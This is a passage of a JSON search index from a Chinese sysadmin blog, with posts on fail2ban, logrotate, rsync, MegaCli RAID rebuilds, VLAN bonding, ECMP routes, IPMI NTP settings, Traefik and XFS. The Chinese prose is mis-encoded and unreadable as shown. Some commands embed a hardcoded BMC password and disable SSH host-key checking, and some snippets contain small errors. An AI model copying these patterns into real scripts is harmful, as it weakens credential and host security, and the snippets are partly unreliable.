æœ€ä¸»è¦çš„å°±æ˜¯ä¿®æ”¹/etc/fail2ban/jail.conf\n1#vi /etc/fail2ban/jail.conf 2...... 3[sshd-iptalbes] 4enabled = true 5filter = sshd 6port = 22 7action = iptables[name=SSH, port=ssh, protocol=tcp] 8logpath = /var/log/secure 9maxretry = 3 10bantime = 86400 11...... æ³¨æ„ä¸Šé¢ç”¨çš„æ˜¯iptablesï¼Œä¸‰æ¬¡å°è¯•å¤±è´¥å°±banä¸€å¤©ã€‚\n","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-fail2ban/","series":null,"tags":null,"title":"ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢"},{"categories":null,"content":"ç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜ æˆ‘ä»¬çš„tomcatçš„catalina.outåŸºæœ¬è¿è¡Œä¸€æ®µæ—¶é—´åä¼šå‡ºç°æ–‡ä»¶è¿‡å¤§çš„é—®é¢˜ï¼Œå¤„ç†ä¸€ä¸‹ã€‚\nå‰ææ˜¯/export/servers/tomcat/ä¸‹éœ€è¦å»ºç«‹ä¸ªè½¯é“¾æ¥tomcatï¼ŒæŒ‡å‘ç°åœ¨æ­£åœ¨ç”¨çš„tomcatç‰ˆæœ¬\nç„¶åå°±å¯ä»¥ç”¨logrotateæ¥è§£å†³catalina.outçš„æ—¥å¿—è½®è½¬é—®é¢˜ã€‚è¿™ç§æ–¹å¼æ¯”è¾ƒç®€å•ã€‚åœ¨/etc/logrotate.d/ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºtomcatçš„æ–‡ä»¶ï¼Œ\n1cat \u0026gt;/etc/logrotate.d/tomcat \u0026lt;\u0026lt;EOF 2/export/servers/tomcat/tomcat/logs/catalina.out{ 3 copytruncate 4 daily 5 rotate 7 6 missingok 7 compress 8} 9EOF ä»¥ä¸Šçš„é…ç½®è¯´æ˜ï¼š\n/export/servers/tomcat/tomcat/logs/catalina.out{ # è¦è½®è½¬çš„æ–‡ä»¶ copytruncate # åˆ›å»ºæ–°çš„catalina.outå‰¯æœ¬åï¼Œtruncateæºcatalina.outæ–‡ä»¶ï¼Œä¼šä¸¢æ•°æ®!!! daily # æ¯å¤©è¿›è¡Œcatalina.outæ–‡ä»¶çš„è½®è½¬ rotate 7 # è‡³å¤šä¿ç•™7ä¸ªå‰¯æœ¬ missingok # å¦‚æœè¦è½®è½¬çš„æ–‡ä»¶ä¸¢å¤±äº†ï¼Œç»§ç»­è½®è½¬è€Œä¸æŠ¥é”™ compress # ä½¿ç”¨å‹ç¼©çš„æ–¹å¼ï¼ˆéå¸¸æœ‰ç”¨ï¼ŒèŠ‚çœç¡¬ç›˜ç©ºé—´ï¼›ä¸€ä¸ª2~3GBçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥å‹ç¼©æˆ60MBå·¦å³ï¼‰ }\nå¯ä»¥æ‰‹å·¥å¼ºåˆ¶æ‰§è¡Œlogrotateç¨‹åºã€‚åœ¨å‘½ä»¤è¡Œè¿è¡Œï¼š\n","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-logrotate/","series":null,"tags":null,"title":"ç”¨logrotateè§£å†³catalinna.outè¿‡å¤§çš„é—®é¢˜"},{"categories":null,"content":"Rsyncçš„åŸºæœ¬å‚æ•° 1-a : å½’æ¡£æ¨¡å¼ï¼Œé€’å½’æ‹·è´ï¼Œå¸¦å±æ€§ã€‚ 2-u : åŒæ­¥æ—¶ç›®æ ‡ç›®å½•ä¸­å¦‚æœæŸæ–‡ä»¶æ¯”æºä¸­æ–‡ä»¶æ—¶é—´è¦æ–°ï¼Œåˆ™ä¿ç•™ä¸åŠ¨ã€‚ 3-v : è¯¦ç»†æ˜¾ç¤ºä¿¡æ¯ 4-z : å‹ç¼© 5-h : æ˜¾ç¤ºå‹å¥½ä¿¡æ¯ 6-P : æ˜¾ç¤ºä¼ è¾“è¿›åº¦ç™¾åˆ†æ¯” 7-R : ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚ 8-e : ä½¿ç”¨sshæ¥ä¼ è¾“ 1 æºå¦‚æœæ²¡æœ‰/ï¼Œä»£è¡¨è¿åŒç›®å½•ä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç»Ÿç»Ÿæ‹·è´åˆ°ç›®çš„å» 2 æºå¦‚æœæœ€åå¸¦/ï¼Œæ„æ€æ˜¯/*ï¼Œä»£è¡¨åªæ‹·è´ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸åŒ…æ‹¬ç›®å½•æœ¬èº« 3 4 å¦‚æœå‚æ•°ä¸­å¸¦-Rï¼Œé‚£æ— è®ºæºåé¢æœ‰æ— /ï¼Œéƒ½æŒ‰åŸæœ‰ç›®å½•çŠ¶æ€æ‹·è¿‡å» -R ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚ å¦‚rsync -av /foo/bar/baz.c remote::/tmp/ï¼Œä¼šå°†baz.cä¼ åˆ°/tmpä¸‹ï¼Œ è€Œä½¿ç”¨äº†-Rï¼Œåˆ™åœ¨/tmpä¸‹çš„æ–‡ä»¶ç»“æ„å°†ä¼šæ˜¯foo/bar/baz.cã€‚\nä¸‹é¢ä¸¤ç§ç”¨æ³•ä¸€æ ·ï¼š\n1rsync -auvPR --exclude \u0026#39;upload\u0026#39; new 172.18.34.38::new/ 2rsync -auvPR --exclude \u0026#39;upload\u0026#39; ./new 172.18.34.38::new/ å¤§è§„æ¨¡ä¼ è¾“ç»†å°æ–‡ä»¶çš„æ–¹æ³•ï¼š 1find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -n 60 -I % -0 rsync -auvPR % 172.18.34.38::new/ -print0 -0 findå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚ -I -IæŒ‡å®šæ¯ä¸€é¡¹å‘½ä»¤è¡Œå‚æ•°çš„æ›¿ä»£å­—ç¬¦ä¸²ã€‚\næ³¨æ„ä¸Šé¢ï¼Œä»æœ€åº•å±‚å¼€å§‹ï¼Œé€æ­¥å‘ä¸ŠåŒæ­¥ã€‚åŒæ­¥å®Œç¬¬6ä¸ªï¼Œç„¶åç¬¬5ä¸ªï¼Œ4 3 2 1 \u0026hellip;\u0026hellip;\næœ€ä½çš„æ˜¯ç¬¬6å±‚ï¼Œæ¯ä¸ªæ–‡ä»¶ä»·æ˜¯ä¸€ä¸ªæ—¥æœŸï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹åŒ…å«3000ä¸ªæ–‡ä»¶å·¦å³ã€‚\né™é€Ÿ 1rsync --bwlimit=500 bwlimitçš„å•ä½æ˜¯kbï¼Œæ‰€ä»¥500Ã—8=4000kb=4000000ï¼Œé™é€Ÿæ˜¯4Mï¼ˆç½‘ç»œå•ä½ï¼‰\nå€Ÿç”¨ssh 1rsync -avzhe ssh backup.tar root@192.168.0.100:/backups/ ","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-rsync/","series":null,"tags":null,"title":"Rsyncçš„æ—¥å¸¸ä½¿ç”¨æ–¹æ³•"},{"categories":null,"content":"192.168.85.7ä¸Šé¢æœ‰ä¸¤ä¸ªRaid\nä¸€ä¸ªRaid1, 500Gï¼Œåº”è¯¥æ˜¯ä¸¤å—ç›˜ï¼Œç°åœ¨ä¸¢äº†ä¸€å—ï¼Œæ­£ç¡®çš„æ§½ä½ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ª å¦ä¸€ä¸ªæ˜¯Raid0ï¼Œ4TBï¼Œè¿è¡Œæ­£å¸¸\nç°åœ¨åœ¨ä¸€ä¸ªæ–°æ§½ä½ä¸Šæ’äº†ä¸€å—ç¡¬ç›˜ï¼Œä½†æ˜¯æ§½ä½ä¸å¯¹ï¼Œæ²¡æœ‰è‡ªåŠ¨rebuildï¼ŒçŠ¶æ€æ˜¯unconfiged good.\né¦–å…ˆæŸ¥ä¸€ä¸‹ä¸¢å¤±çš„ç›˜\n/opt/MegaRAID/MegaCli/MegaCli64 -Pdgetmissing -a0\rå¾—åˆ°å‚æ•°Array 0ï¼ŒRow 1\né¦–å…ˆè¿›è¡Œæ›¿æ¢ï¼Œæ–°ç›˜çš„idæ˜¯32:2ï¼Œæ›¿æ¢æ‰Array0 Row1çš„ç›˜\n1/opt/MegaRAID/MegaCli/MegaCli64 -PdReplaceMissing -PhysDrv [32:2] -Array0 -row1 -a0 ç„¶åå¼ºåˆ¶è¿™å—æ–°ç›˜å¼€å§‹é‡å»º\n1/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -PhysDrv [32:2] -a0 éšæ—¶æŸ¥çœ‹ä¸€ä¸‹è¿›åº¦\n1/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -PhysDrv [32:2] -a0 ä¸Šé¢å·²ç»èµ°äº†5%äº†ï¼Œèµ°å®Œå°±okäº†ã€‚\n","date":"2023-12-27","img":"","permalink":"https://rendoumi.com/posts/20231227-megacli_rebuild/","series":null,"tags":null,"title":"Megacliç”¨æ¥é‡å»ºä¸çŸ¥é“æ­£ç¡®æ§½ä½çš„Raid"},{"categories":null,"content":"é€‚ç”¨äºæ‰€æœ‰MegaCliçš„æœºå™¨ã€‚æ— è®ºdellã€æµªæ½®è¿˜æ˜¯H3Cã€‚\nå¿…é¡»æ¯å¤©ä¸Šåˆã€ä¸‹åˆå„æ£€æŸ¥ä¸€ä¸‹æ‰€æœ‰ç‰©ç†æœºçš„ç£ç›˜å•Šï¼Œæœ‰é—®é¢˜åŠæ—¶å¤„ç†ã€‚\n172.18.31.2 /usr/local/bin/check_disk.sh è„šæœ¬ï¼š\nL1åˆ°L5ï¼Œæ˜¯5ä¸ªæœºæŸœï¼Œä»ä¸Šåˆ°ä¸‹æ˜¯172.18.x.xçš„ipåˆ†å¸ƒ\n1#!/bin/bash 2 3L1=(30.1 30.2 30.3 30.4 30.5 30.6 30.7 30.8 30.9 30.10 30.11 30.12 30.13 30.14 30.15 30.16 20.25 30.18) 4L2=(30.19 20.23 20.24 20.30 20.31 20.9 20.10 20.37 20.38 20.39 30.29 30.30 20.16 20.17 30.33 30.34 30.35 30.36) 5L3=(30.37 20.44 20.45 22.200 30.41 30.42 30.43 30.44 30.45 30.46 30.47 22.201 30.49 30.50 20.51 20.52 20.58 20.59) 6L4=(20.65 20.66 30.57 30.58 30.59 30.60 20.1 20.2 30.63 30.64 30.65 30.66 30.67 30.68 30.69 30.70 30.71 30.72) 7L5=(30.73 30.74 30.75 30.76) 8 9\u0026gt; /tmp/idrac.txt 10\u0026gt; /tmp/idracout.txt 11 12for i in L1 L2 L3 L4 L5 13do 14 var=$i[@] 15 for j in ${!var} 16 do 17 echo \u0026#34;Scan $i 172.18.$j......\u0026#34; \u0026gt;\u0026gt; /tmp/idrac.txt 18 sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.18.$j /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0|grep \u0026#34;S.M.A.R.T\u0026#34; \u0026gt;\u0026gt; /tmp/idrac.txt 19 done 20done 21 22lines=($(grep -n \u0026#34;Yes\u0026#34; /tmp/idrac.txt | cut -f1 -d:)) 23if [ ${#lines[@]} -eq 0 ]; then 24 exit 1 25else 26 for findline in ${lines[@]} 27 do 28 array=($(grep -n \u0026#34;\\.\\.\\.\\.\\.\\.\u0026#34; /tmp/idrac.txt |cut -f1 -d:)) 29 newarray=(${array[*]} ${findline}) 30 sortarray=($(echo ${newarray[@]} | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39;|sort -n)) 31 for((i=0;i\u0026lt;${#sortarray[*]};i++)) 32 do 33 if [ ${sortarray[$i]} -eq $findline ];then 34 beginline=${sortarray[(($i-1))]} 35 endline=${sortarray[(($i+1))]} 36 if [ \u0026#34;$endline\u0026#34; == \u0026#34;\u0026#34; ];then 37 endline=\u0026#34;$\u0026#34; 38 else 39 endline=$(($endline-1)) 40 fi 41 break 42 fi 43 done 44 sed -n \u0026#34;$beginline,$endline p\u0026#34; /tmp/idrac.txt \u0026gt;\u0026gt; /tmp/idracout.txt 45 done 46 /usr/local/bin/mailsend -to \u0026#34;zhangranrui@ddky.com\u0026#34; -from monit@ddky.com -ssl -port 465 -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u0026#34;IDCæœºå™¨ç¡¬ä»¶æ•…éšœ\u0026#34; -v -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; -cs \u0026#34;gb2312\u0026#34; -enc-type \u0026#34;base64\u0026#34; -M \u0026#34;$(cat /tmp/idracout.txt)\u0026#34; 47fi ","date":"2023-12-27","img":"","permalink":"https://rendoumi.com/posts/20231227-megacli_disk/","series":null,"tags":null,"title":"Linuxä¸‹å®šæœŸæ£€æŸ¥ç‰©ç†æœºç£ç›˜çš„è„šæœ¬"},{"categories":null,"content":"æˆ‘ä»¬çš„å®¿ä¸»æœºä¸Šåšäº†4ç½‘å¡bondingï¼Œç„¶åéœ€è¦ä¸Šå‡åˆ°brï¼Œä¸¤ä¸ªç½‘å¡éƒ½éœ€è¦åšä¸Švlanã€‚\næ¯”å¦‚172.18.30.1ï¼Œæƒ³åœ¨ä¸Šé¢å¢åŠ ä¸€ä¸ªVLANæ®µ202ï¼Œç„¶ååœ¨ä¸Šé¢ç”Ÿäº§ä¸€å°è™šæœº172.18.19.2\nå°±éœ€è¦å¢åŠ ä¸€ä¸ªbond0.202ä»¥åŠbr0.202\nåšæ³•å¦‚ä¸‹:\n1cd /etc/sysconfig/network-scripts 2 3cp ifcfg-bond0.199 ifcfg-bond0.202 4 5vi ifcfg-bond0.202 6DEVICE=bond0.202 7ONBOOT=yes 8USERCTL=no 9BRIDGE=br0.202 10VLAN=yes 11 12cp ifcfg-br0.199 ifcfg-br0.199 13 14vi ifcfg-br0.202 15DEVICE=br0.202 16BOOTPROTO=static 17ONBOOT=yes 18TYPE=Bridge ç„¶åå¯åŠ¨è¿™ä¸¤ä¸ªç½‘å¡ï¼Œå¯åŠ¨é¡ºåºå¾ˆé‡è¦ï¼ï¼ï¼\n1ifup bond0.202 2ifup br0.202 æ³¨æ„ï¼Œæ‰§è¡Œå®Œä»¥ååŠ¡å¿…æ£€æŸ¥ä¸€ä¸‹ä¸¤ä¸ªç½‘å¡æ˜¯å¦UP\nç„¶åäº§è™šæœºå°±å¥½\n1./vm.sh create -b br0.202 -c 4 -m 4096 -d 40 -i 172.18.19.2 -k 255.255.255.0 -g 172.18.19.254 -q 172.18.30.1 -r 172.18.30.2 ucarp-18-19-2 ","date":"2023-12-27","img":"","permalink":"https://rendoumi.com/posts/20231227-vlan_bond_br/","series":null,"tags":null,"title":"Linuxä¸‹bondå’Œbrå»ºç«‹vlançš„æ–¹æ³•"},{"categories":null,"content":"æˆ‘ä»¬æœ‰ä¸¤ä¸ªå‡ºå£ï¼Œä¸€ä¸ªä»æ— é”¡å‡ºï¼Œä¸€ä¸ªä»ä¸–çºªäº’è”å‡º\nè¿™å°æœºå™¨çš„em1æ¥ä¸–çºªäº’è”ï¼Œem2æ¥æ— é”¡å°šèˆªï¼Œä¸¤ä¸ªç½‘å…³ï¼Œæœ‰ipv6å’Œipv4\nISP 1:\rGateways:\r172.16.9.254\r2001:db8:a::1\rInterface: em1\rISP 2:\rGateways:\r172.18.9.254\r2001:db8:b::1\rInterface: em2\ré‚£ä¹ˆè¿™å°æœºå™¨çš„ECMPç­‰ä»·è·¯ç”±è¿™ä¹ˆåšï¼š\nip route replace default proto static scope global \\\rnexthop dev em1 via 172.16.9.254 weight 1 \\\rnexthop dev em2 via 172.18.9.254 weight 1\rip -6 route replace default proto static scope global \\\rnexthop dev em1 via 2001:db8:a::1 weight 1 \\\rnexthop dev em2 via 2001:db8:b::1 weight 1\rè¿™ä¸¤æ¡å‘½ä»¤éœ€è¦æ”¾åˆ° /etc/rc.d/rc.locl æˆ–è€…ifupé‡Œé¢å»\nä¹‹åå‘åŒ…çš„æ—¶å€™å°±ä¼šä¸€å·¦ä¸€å³è½®æµå‘ã€‚\n","date":"2023-12-27","img":"","permalink":"https://rendoumi.com/posts/20231227-linux_ecmp/","series":null,"tags":null,"title":"Linuxä¸‹ECMPç­‰ä»·è·¯ç”±çš„å»ºç«‹"},{"categories":null,"content":"å®¡è®¡çš„è¦æ±‚ï¼š\nçº¿ä¸Šç¯å¢ƒç ”å‘åªèƒ½æœ‰åªè¯»æƒé™\né‚£åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼Œä¸¤ä¸ªç”¨æˆ·ï¼Œsupdevæ˜¯è¿ç»´ç”¨æ¥ç®¡ç†çš„ï¼Œlogviewæ˜¯ç ”å‘ç”¨æ¥åªè¯»æ—¥å¿—çš„\nä¸€ã€é¦–å…ˆç¡®å®šç³»ç»Ÿæœ‰supdevç”¨æˆ·å­˜åœ¨ id supdev é€šå¸¸supdevçš„idæ˜¯511\näºŒã€å¢åŠ æ–°ç”¨æˆ·logview æˆ‘ä»¬ç¡®å®šlogviewçš„idæ˜¯512ï¼Œgroupæ˜¯å’ŒsupdevåŒç»„ useradd -u 512 -g supdev logview\nä¸‰ã€ç¨‹åºçš„appä»¥åŠæ•°æ®ç›®å½•ä¸æ˜¯åœ¨supdevçš„homeç›®å½•ä¸‹ï¼Œè€Œæ˜¯åœ¨/data/serversä¸‹ æ‰€ä»¥æˆ‘ä»¬æŠŠ/data/serversä¸‹çš„ç›®å½•éƒ½æ”¹æˆ750ï¼Œæ–‡ä»¶éƒ½æ”¹æˆ640\n1#!/bin/sh 2find /export/servers/ -type d ! -perm 0750 -exec chmod 0750 {} 3find /export/servers/ -type f ! -perm 0640 -exec chmod 0640 {} 1# ansible æ¨¡å— 2- name: make dirs 0755 3 command: find {{ your_path }} -type d ! -perm 0750 -exec chmod 0750 {} \\; 4 5- name: make files 0644 6 command: find {{ your_path }} -type f ! -perm 0640 -exec chmod 0640 {} \\; è¿™æ ·å°±å¯ä»¥äº†ã€‚logviewå¯ä»¥å»åˆ°/data/serversç›®å½•ï¼Œå¯ä»¥çœ‹æ–‡ä»¶ï¼Œä½†æ— æ³•æ‰§è¡Œã€‚\n","date":"2023-12-27","img":"","permalink":"https://rendoumi.com/posts/20231227-supdev_logview/","series":null,"tags":null,"title":"å®¡è®¡éœ€æ±‚åªè¯»ç”¨æˆ·çš„å»ºç«‹"},{"categories":null,"content":"H3CæœåŠ¡å™¨ä¸»æ¿æ—¶é—´ä¸å‡†ç¡®ä¹Ÿå¾ˆè®¨åŒï¼Œçœ‹ä¸»æ¿æ—¥å¿—æ—¶é—´éƒ½æ˜¯é”™çš„ï¼Œæ²¡åŠæ³•ï¼Œä¿®æ”¹ä¸€ä¸‹ã€‚\nH3CæœåŠ¡å™¨BIOSçš„NTPè®¾ç½®æ–¹æ³•ï¼š\nä¿®æ”¹ä¸»æœåŠ¡å™¨ï¼š\n1ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸² ä¿®æ”¹è¾…æœåŠ¡å™¨ï¼š\n1ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x02 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸² ä¿®æ”¹ç¬¬ä¸‰ä¸ªæœåŠ¡å™¨ï¼š\n1ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x05 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸² æ–¹æ³•å¾ˆç®€å•ï¼Œä½†æ˜¯æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²å¦‚ä½•å¾—åˆ°ï¼Ÿ\n1echo -n \u0026#34;172.18.30.1\u0026#34; | od -A n -t x1 | sed \u0026#34;s/ / 0x/g\u0026#34; 20x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31 ä¿®æ”¹NTPæœåŠ¡å™¨1ä¸º172.18.30.1\n1ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31 ","date":"2023-12-26","img":"","permalink":"https://rendoumi.com/posts/20231226-h3c_ntp/","series":null,"tags":null,"title":"H3CæœåŠ¡çš„BIOSä¸»æ¿è®¾ç½®ä¸­å¦‚ä½•æ­£ç¡®è®¾ç½®NTPæœåŠ¡å™¨"},{"categories":null,"content":"traefikä½¿ç”¨digicertä»˜è´¹çš„è¯ä¹¦å’Œä½¿ç”¨letencryptå…è´¹è¯ä¹¦çš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€ä¹ˆé…ç½®ï¼š\ntraefik.ymlé‡Œé¢å°±æ²¡æœ‰ä»»ä½•é…ç½®\n1log: 2 level: DEBUG 3 4api: 5 insecure: false 6 dashboard: true 7 8entryPoints: 9 http: 10 address: \u0026#34;:80\u0026#34; 11 #http: 12 # redirections: 13 # entryPoint: 14 # to: https 15 # scheme: https 16 17 https: 18 address: \u0026#34;:443\u0026#34; 19 20providers: 21 file: 22 directory: /export/servers/traefik/dynamic 23 watch: true æ‰€æœ‰çš„é…ç½®éƒ½æ”¾åˆ°åˆ°/export/servers/traefik/dynamicç›®å½•ä¸‹äº†ï¼ŒåŠ¨æ€æ›´æ–°ï¼š\ncerts.ymlæ¥å®šä¹‰è¯ä¹¦é€‰é¡¹\n1tls: 2 certificates: 3 - certFile: \u0026#34;/export/servers/traefik/ddky.crt\u0026#34; 4 keyFile: \u0026#34;/export/servers/traefik/ddky.key\u0026#34; 5 options: 6 default: 7 sniStrict: true 8 minVersion: VersionTLS12 9 cipherSuites: 10 - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 11 - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 12 - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 13 - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 14 - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 test7-01.ymlå•ç‹¬test7.ddky.comçš„é…ç½®\n1http: 2 routers: 3 https_01: 4 rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; 5 service: svc_01 6 tls: 7 domains: 8 - main: \u0026#34;test7.ddky.com\u0026#34; 9 sans: 10 - \u0026#34;*.ddky.com\u0026#34; 11 12 http_01: 13 rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; 14 service: svc_01 15 entryPoints: 16 - http 17 18 services: 19 svc_01: 20 loadBalancer: 21 servers: test8-02.ymlå•ç‹¬test8.ddky.comçš„é…ç½®\n1http: 2 routers: 3 https_02: 4 rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; 5 service: svc_02 6 tls: 7 domains: 8 - main: \u0026#34;test8.ddky.com\u0026#34; 9 10 http_02: 11 rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; 12 service: svc_02 13 entryPoints: 14 - http 15 16 services: 17 svc_02: 18 loadBalancer: 19 servers: 20 - url: \u0026#34;http://172.18.31.33:80\u0026#34; æ³¨æ„ä¸Šé¢tlsçš„é€‰é¡¹ï¼Œsanså¤‡ç”¨åŸŸåå¯åŠ å¯ä¸åŠ ã€‚\n","date":"2023-12-21","img":"","permalink":"https://rendoumi.com/posts/20231221-traefik_digicert/","series":null,"tags":null,"title":"Traefiké…ç½®digicertå®¶å¾—æ³›åŸŸåè¯ä¹¦"},{"categories":null,"content":"åœ¨172.18.30.1å’Œ172.16.60.10ä¸Š\nä½¿ç”¨vm.shåˆ›å»ºè™šæœºæ—¶ï¼Œä¼šæŠ¥é”™\n1- Resizing the disk to 80G ... ERR: Could not resize disk. å» /export/kvm/è™šæœºç›®å½•ä¸‹æŸ¥çœ‹log\n1Could not open \u0026#39;/var/tmp/.guestfs-101448/appliance.d/root\u0026#39;: No such file or directory è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œæ¸…é™¤æ‰Cacheå³å¯ï¼š\n1rm -rf /var/tmp/.guestfs-0/ é™„ä¸ŠCentOS7å®‰è£… kvm çš„å‘½ä»¤ï¼š\n1yum install qemu-kvm libvirt libvirt-python libguestfs-tools virt-install ","date":"2023-12-21","img":"","permalink":"https://rendoumi.com/posts/20231221-vm_error/","series":null,"tags":null,"title":"Vm.shåˆ›å»ºè™šæœºå¤±è´¥"},{"categories":null,"content":"ç»ˆäºé‡åˆ°äº†inodeä¸å¤Ÿäº†ï¼Œç»†ç¢æ–‡ä»¶çˆ†æ£šäº†ï¼Œå¯¼è‡´inodeä¸å¤Ÿäº†ã€‚\nXFS æ–‡ä»¶ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯æ²¡æœ‰ inode çš„é™åˆ¶çš„\nåªæœ‰ä¸€ä¸ªç¼ºçœçš„é™åˆ¶ï¼Œä½¿ç”¨ç°æœ‰æ–‡ä»¶ç³»ç»Ÿçš„ 25% æ¥å­˜å‚¨ inode ä¿¡æ¯ã€‚\nè¿™ä¸ªç¼ºçœçš„é…ç½®åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯å¤Ÿç”¨çš„ã€‚\næŸäº›æƒ…å†µä¸‹ä¸å¤Ÿç”¨ï¼Œå¯ä»¥åˆ é™¤ä¸€äº›æ–‡ä»¶æ¥ç¼“è§£ã€‚\nç»ˆæåŠæ³•æ˜¯å¢å¤§è¿™ä¸ª 25% çš„é˜ˆå€¼æ¥è§£å†³ï¼š\n1root@zombie:~# xfs_info /srv/backup/ 2metadane=/dev/mapper/slow-backup isize=256 agcount=17, agsize=2621440 blks 3 = sectsz=512 attr=2 4data = bsize=4096 blocks=44564480, imaxpct=25 5 = sunit=0 swidth=0 blks 6naming =version 2 bsize=4096 7 ascii-ci=0 8log =internal bsize=4096 blocks=20480, version=2 9 = sectsz=512 sunit=0 blks, lazy-count=1 10realtime=brak extsz=4096 blocks=0, rtextents=0 ä¸Šé¢ï¼Œæˆ‘ä»¬çœ‹åˆ° imaxpct=25 ï¼Œå°±æ˜¯è¿™ä¸ªé…ç½®äº†ã€‚\nå¢å¤§çš„æ–¹æ³•ï¼š\n1xfs_growfs -m 30 è¿™æ ·å°±å¢å¤§åˆ° 30% äº†\n","date":"2023-12-21","img":"","permalink":"https://rendoumi.com/posts/20231221-inode_xfs/","series":null,"tags":null,"title":"Xfsæ–‡ä»¶ç³»ç»Ÿä¸‹å¢åŠ inode"},{"categories":null,"content":"åœ¨æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤free -g å’Œ free -k\nçœ‹çœ‹æœ‰å¤šå°‘ç©ºé—²\n8Gçš„Swapäº¤æ¢ç©ºé—´éƒ½è¢«ç”¨å…‰äº†ï¼ï¼ï¼\nå†ç”¨kbçš„å•ä½çœ‹çœ‹ï¼Œä¸€å…±8388604ï¼ŒåŸºæœ¬ç”¨å…‰æ‰äº†\næŸ¥çœ‹æ˜¯å“ªäº›è¿›ç¨‹ä½¿ç”¨äº†äº¤æ¢ç©ºé—´ï¼š\n1find /proc -maxdepth 2 -path \u0026#34;/proc/[0-9]*/status\u0026#34; -readable -exec awk -v FS=\u0026#34;:\u0026#34; \u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) printf \u0026#34;%10s %-30s %20s\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;]}\u0026#39; \u0026#39;{}\u0026#39; \\; | awk \u0026#39;{print $(NF-1),$0}\u0026#39; | sort -h | cut -d \u0026#34; \u0026#34; -f2- 6504çš„qemu-kvmç”¨æ‰äº†4.8Gï¼Œçœ‹èµ·æ¥ä¸å¤ªç›´è§‚ã€‚\n1find /proc -maxdepth 2 -path \u0026#34;/proc/[0-9]*/status\u0026#34; -readable -exec awk -v FS=\u0026#34;:\u0026#34; -v TOTSWP=\u0026#34;$(cat /proc/swaps | sed 1d | awk \u0026#39;BEGIN{sum=0} {sum=sum+$(NF-2)} END{print sum}\u0026#39;)\u0026#34; \u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) {used_swap=process[\u0026#34;VmSwap\u0026#34;];sub(/[ a-zA-Z]+/,\u0026#34;\u0026#34;,used_swap);percent=(used_swap/TOTSWP*100); printf \u0026#34;%10s %-30s %20s %6.2f%\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;],percent} }\u0026#39; \u0026#39;{}\u0026#39; \\; | awk \u0026#39;{print $(NF-2),$0}\u0026#39; | sort -hr | head | cut -d \u0026#34; \u0026#34; -f2- 